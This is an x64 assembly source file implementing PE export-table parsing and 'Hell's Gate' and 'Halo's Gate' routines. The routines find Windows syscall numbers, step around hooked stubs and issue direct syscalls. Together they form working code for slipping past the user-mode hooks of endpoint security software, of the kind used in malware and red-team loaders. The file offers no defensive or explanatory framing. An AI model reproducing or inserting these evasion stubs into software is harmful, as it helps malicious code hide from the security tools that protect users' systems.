 .code

 getExportDirectory PROC
     mov r8, rcx
     mov ebx, [rcx+3Ch]
     add rbx, r8
     xor rcx, rcx
     add cx, 88h
     mov eax, [rbx+rcx]
     add rax, r8
     ret                     ; return ExportDirectory
 getExportDirectory ENDP

 getExportAddressTable PROC
     xor rax, rax
     add rdx, 1Ch             ; DWORD AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
     mov eax, [rdx]           ; RAX = RVAExportAddressTable (Value/RVA)
     add rax, rcx             ; RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
     ret                      ; return ExportAddressTable
 getExportAddressTable ENDP

 getExportNameTable PROC
     xor rax, rax
     add rdx, 20h            ; DWORD AddressOfFunctions; // 0x20 offset
     mov eax, [rdx]           ; RAX = RVAExportAddressOfNames (Value/RVA)
     add rax, rcx             ; RAX = VA ExportAddressOfNames
     ret    ; return ExportNameTable;
 getExportNameTable ENDP

 getExportOrdinalTable PROC
     xor rax, rax
     add rdx, 24h            ; DWORD AddressOfNameOrdinals; // 0x24 offset
     mov eax, [rdx]           ; RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
     add rax, rcx             ; RAX = VA ExportAddressOfNameOrdinals
     ret    ; return ExportOrdinalTable;
 getExportOrdinalTable ENDP

 getSymbolAddress PROC
     mov r10, [RSP+28h]    ; ExportNameTable
     mov r11, [RSP+30h]    ; ExportOrdinalTable
     xchg rcx, rdx    ; RCX = symbolStringSize & RDX =symbolString
     push rcx    ; push str len to stack
     xor rax, rax
 getSymbolAddress ENDP

 loopFindSymbol PROC
     mov rcx, [rsp]                ; RCX/[RSP] = DWORD symbolStringSize (Reset string length counter for each loop)
     xor rdi, rdi                  ; Clear RDI for setting up string name retrieval
     mov edi, [r10+rax*4h]          ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
     add rdi, r8                   ; RDI = &NameString    = RVA NameString + &module.dll
     mov rsi, rdx                  ; RSI = Address of API Name String to match on the Stack (reset to start of string)
     repe cmpsb                    ; Compare strings at RDI & RSI
     je FoundSymbol                ; If match then we found the API string. Now we need to find the Address of the API
     inc rax                       ; Increment to check if the next name matches
     jmp short loopFindSymbol      ; Jump back to start of loop
 loopFindSymbol ENDP

 FoundSymbol PROC
     pop rcx                       ; Remove string length counter from top of stack
     mov ax, [r11+rax*2h]           ; RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
     mov eax, [r9+rax*4h]           ; RAX = RVA API = [&AddressTable + API OrdinalNumber]
     add rax, r8                   ; RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
     sub r11, rax                  ; See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
     jns isNotForwarder            ; If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
     xor rax, rax                  ; If forwarder, return 0x0 and exit
 FoundSymbol ENDP

 isNotForwarder PROC
     ret
 isNotForwarder ENDP

 findSyscallNumber PROC
	xor rsi, rsi
	xor rdi, rdi
	mov rsi, 00B8D18B4Ch
	mov edi, [rcx]
	cmp rsi, rdi
	jne error
	xor rax,rax
	mov ax, [rcx+4]
	ret
findSyscallNumber ENDP

error PROC
	xor rax, rax
	ret
error ENDP

halosGateUp PROC
	xor rsi, rsi
	xor rdi, rdi
	mov rsi, 00B8D18B4Ch
	xor rax, rax
	mov al, 20h
	mul dx
	add rcx, rax
	mov edi, [rcx]
	cmp rsi, rdi
	jne error
	xor rax,rax
	mov ax, [rcx+4]
	ret
halosGateUp ENDP

halosGateDown PROC
	xor rsi, rsi
	xor rdi, rdi
	mov rsi, 00B8D18B4Ch
	xor rax, rax
	mov al, 20h
	mul dx
	sub rcx, rax
	mov edi, [rcx]
	cmp rsi, rdi
	jne error
	xor rax,rax
	mov ax, [rcx+4]
	ret
halosGateDown ENDP

HellsGate PROC
	xor r11, r11
	mov r11d, ecx
	ret
HellsGate ENDP

HellDescent PROC
	xor rax, rax
	mov r10, rcx
	mov eax, r11d
	syscall
	ret
HellDescent ENDP

pageAlign PROC
	or cx, 0FFFh       ; This with +1 will align us to a memory page.
	sub rcx, 0FFFh
	xchg rax, rcx     ; return aligned page
    ret
pageAlign ENDP

 end